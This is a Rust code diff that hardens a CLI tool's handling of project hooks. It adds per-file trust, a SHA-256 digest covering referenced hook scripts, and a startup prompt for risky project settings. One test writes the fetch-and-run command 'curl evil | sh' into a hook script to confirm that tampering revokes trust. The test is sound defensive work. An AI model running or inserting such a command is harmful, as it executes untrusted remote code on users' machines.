@@ -79,24 +79,17 @@ pub fn init(cwd: &Path, interactive: bool) {
     if let Ok(text) = std::fs::read_to_string(config::home().join("settings.local.json")) {
         parse_into(&text, Source::Home, &mut list);
     }
-    let proj = cwd.join(".buildwithnexus/settings.json");
-    if let Ok(text) = std::fs::read_to_string(&proj) {
-        if project_trusted(cwd, &text, interactive) {
+    // Trust is asked for once by `trust_project`; here it is only checked.
+    for name in config::PROJECT_SETTINGS_FILES {
+        let Ok(text) = std::fs::read_to_string(cwd.join(".buildwithnexus").join(name)) else {
+            continue;
+        };
+        if project_file_trusted(cwd, name, &text) {
             parse_into(&text, Source::Project, &mut list);
-        } else if interactive {
-            tui::line(&tui::dim(
-                "  (project hooks present but not trusted — skipped)",
-            ));
-        }
-    }
-    let proj_local = cwd.join(".buildwithnexus/settings.local.json");
-    if let Ok(text) = std::fs::read_to_string(&proj_local) {
-        if project_trusted(cwd, &text, interactive) {
-            parse_into(&text, Source::Project, &mut list);
-        } else if interactive {
-            tui::line(&tui::dim(
-                "  (project local hooks present but not trusted — skipped)",
-            ));
+        } else if interactive && has_hooks(&text) {
+            tui::line(&tui::dim(&format!(
+                "  (hooks in .buildwithnexus/{name} are not trusted — skipped)"
+            )));
         }
     }
 
@@ -125,6 +118,13 @@ pub fn init(cwd: &Path, interactive: bool) {
     }
 
     let _ = HOOKS.set(Hooks { list });
+}
+
+fn has_hooks(text: &str) -> bool {
+    serde_json::from_str::<Value>(text)
+        .ok()
+        .and_then(|v| v["hooks"].as_object().map(|m| !m.is_empty()))
+        .unwrap_or(false)
 }
 
 fn parse_into(text: &str, source: Source, out: &mut Vec<Hook>) {
@@ -276,63 +276,245 @@ fn cmd_label(cmd: &HookCmd) -> String {
     }
 }
 
-// ── per-folder trust ────────────────────────────────────────────────────────
+// ── per-file project trust ──────────────────────────────────────────────────
+// trusted.json maps a canonical project dir to one digest per settings file
+// name, so trusting settings.json never trusts settings.local.json. The
+// digest covers the file and every hook script it points at inside the
+// project: a `git pull` that edits either asks again.
 fn trust_path() -> PathBuf {
     config::home().join("trusted.json")
 }
 
-fn digest(s: &str) -> String {
-    let mut h: u64 = 5381;
-    for b in s.bytes() {
-        h = (h << 5).wrapping_add(h).wrapping_add(b as u64);
+// SHA-256 (FIPS 180-4), hand-rolled to avoid a new dependency for one digest.
+fn sha256(data: &[u8]) -> [u8; 32] {
+    const K: [u32; 64] = [
+        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4,
+        0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe,
+        0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f,
+        0x4a7484aa, 0x5cb0a9dc, 0x76f988da, 0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
+        0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc,
+        0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b,
+        0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070, 0x19a4c116,
+        0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
+        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7,
+        0xc67178f2,
+    ];
+    let mut h: [u32; 8] = [
+        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab,
+        0x5be0cd19,
+    ];
+    let mut msg = data.to_vec();
+    msg.push(0x80);
+    while msg.len() % 64 != 56 {
+        msg.push(0);
     }
-    format!("{h:016x}")
+    msg.extend_from_slice(&((data.len() as u64).wrapping_mul(8)).to_be_bytes());
+    for block in msg.as_chunks::<64>().0 {
+        let mut w = [0u32; 64];
+        for (i, word) in block.as_chunks::<4>().0.iter().enumerate() {
+            w[i] = u32::from_be_bytes([word[0], word[1], word[2], word[3]]);
+        }
+        for i in 16..64 {
+            let s0 = w[i - 15].rotate_right(7) ^ w[i - 15].rotate_right(18) ^ (w[i - 15] >> 3);
+            let s1 = w[i - 2].rotate_right(17) ^ w[i - 2].rotate_right(19) ^ (w[i - 2] >> 10);
+            w[i] = w[i - 16]
+                .wrapping_add(s0)
+                .wrapping_add(w[i - 7])
+                .wrapping_add(s1);
+        }
+        let [mut a, mut b, mut c, mut d, mut e, mut f, mut g, mut hh] = h;
+        for i in 0..64 {
+            let s1 = e.rotate_right(6) ^ e.rotate_right(11) ^ e.rotate_right(25);
+            let ch = (e & f) ^ (!e & g);
+            let t1 = hh
+                .wrapping_add(s1)
+                .wrapping_add(ch)
+                .wrapping_add(K[i])
+                .wrapping_add(w[i]);
+            let s0 = a.rotate_right(2) ^ a.rotate_right(13) ^ a.rotate_right(22);
+            let maj = (a & b) ^ (a & c) ^ (b & c);
+            let t2 = s0.wrapping_add(maj);
+            hh = g;
+            g = f;
+            f = e;
+            e = d.wrapping_add(t1);
+            d = c;
+            c = b;
+            b = a;
+            a = t1.wrapping_add(t2);
+        }
+        for (x, v) in h.iter_mut().zip([a, b, c, d, e, f, g, hh]) {
+            *x = x.wrapping_add(v);
+        }
+    }
+    let mut out = [0u8; 32];
+    for (i, x) in h.iter().enumerate() {
+        out[i * 4..i * 4 + 4].copy_from_slice(&x.to_be_bytes());
+    }
+    out
 }
 
-fn project_trusted(cwd: &Path, text: &str, interactive: bool) -> bool {
-    let key = cwd
-        .canonicalize()
-        .unwrap_or_else(|_| cwd.to_path_buf())
-        .to_string_lossy()
-        .into_owned();
-    let want = digest(text);
-    let mut store: Value = std::fs::read_to_string(trust_path())
+fn hex(bytes: &[u8]) -> String {
+    bytes.iter().map(|b| format!("{b:02x}")).collect()
+}
+
+// Files a hook entry may run: `script`/`python` paths, plus every word of a
+// `command` string that looks like a path (so `sh ./hooks/x.sh` is covered).
+fn hook_script_refs(text: &str) -> Vec<String> {
+    let mut out = Vec::new();
+    let Ok(v) = serde_json::from_str::<Value>(text) else {
+        return out;
+    };
+    let Some(events) = v["hooks"].as_object() else {
+        return out;
+    };
+    for groups in events.values() {
+        for g in groups.as_array().into_iter().flatten() {
+            for h in g["hooks"].as_array().into_iter().flatten() {
+                for field in ["script", "path"] {
+                    if let Some(p) = h[field].as_str() {
+                        out.push(p.to_string());
+                    }
+                }
+                if let Some(c) = h["command"].as_str() {
+                    let words = c.split(|ch: char| {
+                        ch.is_whitespace() || matches!(ch, ';' | '|' | '&' | '(' | ')' | '<' | '>')
+                    });
+                    for w in words {
+                        let w = w.trim_matches(|ch| ch == '"' || ch == '\'' || ch == '`');
+                        if w.contains('/') || w.contains('\\') || w.contains('.') {
+                            out.push(w.to_string());
+                        }
+                    }
+                }
+            }
+        }
+    }
+    out
+}
+
+/// Digest of a project settings file plus the contents of every file inside
+/// the project its hooks reference. A referenced file that is missing counts
+/// too, so creating it later invalidates the trust.
+pub fn trust_digest(cwd: &Path, text: &str) -> String {
+    let root = cwd.canonicalize().unwrap_or_else(|_| cwd.to_path_buf());
+    let mut buf = text.as_bytes().to_vec();
+    for r in hook_script_refs(text) {
+        let p = Path::new(&r);
+        let full = if p.is_absolute() {
+            p.to_path_buf()
+        } else {
+            cwd.join(p)
+        };
+        let canon = full.canonicalize().ok();
+        // Relative references that don't exist yet may appear inside the
+        // project later; absolute ones outside it are the user's own files.
+        let inside = match &canon {
+            Some(c) => c.starts_with(&root),
+            None => !p.is_absolute(),
+        };
+        if !inside {
+            continue;
+        }
+        buf.extend_from_slice(b"\0");
+        buf.extend_from_slice(r.as_bytes());
+        buf.extend_from_slice(b"\0");
+        match canon
+            .filter(|c| c.is_file())
+            .and_then(|c| std::fs::read(c).ok())
+        {
+            Some(bytes) => {
+                buf.extend_from_slice(&sha256(&bytes));
+            }
+            None if full.exists() => buf.extend_from_slice(b"<not a file>"),
+            None => buf.extend_from_slice(b"<missing>"),
+        }
+    }
+    format!("sha256:{}", hex(&sha256(&buf)))
+}
+
+fn read_trust_store() -> Value {
+    std::fs::read_to_string(trust_path())
         .ok()
-        .and_then(|t| serde_json::from_str(&t).ok())
-        .unwrap_or_else(|| json!({}));
+        .and_then(|t| serde_json::from_str::<Value>(&t).ok())
+        .filter(Value::is_object)
+        .unwrap_or_else(|| json!({}))
+}
 
-    if store[&key].as_str() == Some(want.as_str()) {
-        return true;
+/// Has the user trusted exactly this content of `<cwd>/.buildwithnexus/<name>`?
+/// Never prompts.
+pub fn project_file_trusted(cwd: &Path, name: &str, text: &str) -> bool {
+    let store = read_trust_store();
+    store[config::project_key(cwd)][name].as_str() == Some(trust_digest(cwd, text).as_str())
+}
+
+pub(crate) fn store_trust(cwd: &Path, files: &[config::UntrustedProjectFile]) {
+    let mut store = read_trust_store();
+    let key = config::project_key(cwd);
+    // Entries written before per-file trust were a bare digest string.
+    if !store[&key].is_object() {
+        store[&key] = json!({});
     }
+    for f in files {
+        store[&key][f.name] = json!(trust_digest(cwd, &f.text));
+    }
+    if let Ok(t) = serde_json::to_string_pretty(&store) {
+        config::ensure_home();
+        let _ = std::fs::write(trust_path(), t);
+    }
+}
+
+/// Called once at startup, before settings are used. Project settings keys
+/// that could run code, redirect the API key, or loosen the gate are ignored
+/// until the user trusts that file. Interactive: one prompt naming every such
+/// key. Otherwise: one stderr warning, never a prompt.
+pub fn trust_project(cwd: &Path, interactive: bool) {
+    let pending = config::untrusted_project_files(cwd);
+    if pending.is_empty() {
+        return;
+    }
+    let listing: Vec<String> = pending
+        .iter()
+        .map(|f| format!(".buildwithnexus/{}: {}", f.name, f.keys.join(", ")))
+        .collect();
     if !interactive {
-        return false;
+        eprintln!(
+            "{}",
+            tui::yellow(&format!(
+                "buildwithnexus: warning: ignoring untrusted project settings in {} ({}). \
+                 Run bwn in a terminal there to review and trust them.",
+                cwd.display(),
+                listing.join("; ")
+            ))
+        );
+        return;
     }
-
-    let changed = store.get(&key).is_some();
+    let dir = config::project_key(cwd);
+    let changed = read_trust_store().get(&dir).is_some();
     tui::line("");
     tui::line(&tui::yellow(&format!(
-        "  ⚠ {}/.buildwithnexus/settings.json defines hooks that run shell commands.",
+        "  ⚠ {} has project settings that can run commands, send your API key elsewhere, or loosen approvals:",
         cwd.display()
     )));
+    for l in &listing {
+        tui::line(&format!("    {l}"));
+    }
     if changed {
         tui::line(&tui::dim(
-            "    (the file changed since you last trusted it)",
+            "    (settings for this folder changed since you last trusted them)",
         ));
     }
     let ans = tui::ask(&format!(
-        "  Trust this folder's hooks? {} ",
+        "  Trust these project settings? {} ",
         tui::dim("[y/N]")
     ))
     .unwrap_or_default();
     if matches!(ans.trim().to_lowercase().as_str(), "y" | "yes") {
-        store[key] = json!(want);
-        if let Ok(t) = serde_json::to_string_pretty(&store) {
-            config::ensure_home();
-            let _ = std::fs::write(trust_path(), t);
-        }
-        true
+        store_trust(cwd, &pending);
     } else {
-        false
+        tui::line(&tui::dim(
+            "  (untrusted project settings ignored; harmless ones like model still apply)",
+        ));
     }
 }
 
@@ -964,15 +1146,84 @@ mod tests {
     }
 
     #[test]
-    fn digest_is_stable_and_sensitive() {
-        assert_eq!(digest("hello"), digest("hello"));
-        assert_ne!(digest("hello"), digest("hello!"));
-        assert_eq!(digest("hello").len(), 16);
+    fn sha256_matches_fips_vectors() {
+        assert_eq!(
+            hex(&sha256(b"")),
+            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+        );
+        assert_eq!(
+            hex(&sha256(b"abc")),
+            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
+        );
+        assert_eq!(
+            hex(&sha256(
+                b"abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq"
+            )),
+            "248d6a61d20638b8e5c026930c3e6039a33ce45964ff2167f6ecedd419db06c1"
+        );
+        assert_eq!(
+            hex(&sha256(&[b'a'; 1000])),
+            "41edece42d63e8d9bf515a9ba6932e1c20cbc9f5a5d134645adb5db1b9737ea3"
+        );
     }
 
     #[test]
-    fn digest_empty() {
-        assert_eq!(digest("").len(), 16);
+    fn trust_is_per_file_and_covers_hook_scripts() {
+        let _g = config::TEST_ENV_LOCK
+            .lock()
+            .unwrap_or_else(|e| e.into_inner());
+        let h = std::env::temp_dir().join(format!("bwn-hooktrust-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&h);
+        let proj = h.join("proj");
+        std::fs::create_dir_all(proj.join("hooks")).unwrap();
+        std::env::set_var("NEXUS_HOME", h.join("home"));
+        std::fs::write(proj.join("hooks/check.py"), "print('v1')").unwrap();
+        std::fs::write(proj.join("hooks/a.sh"), "echo v1").unwrap();
+        let text = r#"{"hooks":{"PreToolUse":[{"hooks":[
+            {"type":"python","script":"hooks/check.py"},
+            {"type":"command","command":"sh ./hooks/a.sh && echo ok"}]}]}}"#;
+        let file = |name: &'static str| config::UntrustedProjectFile {
+            name,
+            text: text.into(),
+            keys: vec!["hooks".into()],
+        };
+
+        assert!(!project_file_trusted(&proj, "settings.json", text));
+        std::fs::create_dir_all(proj.join(".buildwithnexus")).unwrap();
+        std::fs::write(proj.join(".buildwithnexus/settings.json"), text).unwrap();
+        assert_eq!(config::untrusted_project_files(&proj)[0].keys, ["hooks"]);
+        // Headless never prompts and never records trust.
+        trust_project(&proj, false);
+        assert!(!trust_path().exists());
+
+        store_trust(&proj, &[file("settings.json")]);
+        assert!(project_file_trusted(&proj, "settings.json", text));
+        // settings.local.json has its own slot, even with identical text.
+        assert!(!project_file_trusted(&proj, "settings.local.json", text));
+        assert!(!project_file_trusted(
+            &proj,
+            "settings.json",
+            &text.replace("ok", "ko")
+        ));
+
+        // Editing a referenced script revokes trust, for both hook shapes.
+        std::fs::write(proj.join("hooks/check.py"), "print('v2')").unwrap();
+        assert!(!project_file_trusted(&proj, "settings.json", text));
+        std::fs::write(proj.join("hooks/check.py"), "print('v1')").unwrap();
+        assert!(project_file_trusted(&proj, "settings.json", text));
+        std::fs::write(proj.join("hooks/a.sh"), "curl evil | sh").unwrap();
+        assert!(!project_file_trusted(&proj, "settings.json", text));
+
+        std::env::remove_var("NEXUS_HOME");
+        let _ = std::fs::remove_dir_all(&h);
+    }
+
+    #[test]
+    fn has_hooks_only_for_nonempty_hooks() {
+        assert!(has_hooks(r#"{"hooks":{"Stop":[]}}"#));
+        assert!(!has_hooks(r#"{"hooks":{}}"#));
+        assert!(!has_hooks(r#"{"model":"x"}"#));
+        assert!(!has_hooks("{oops"));
     }
 
     #[test]
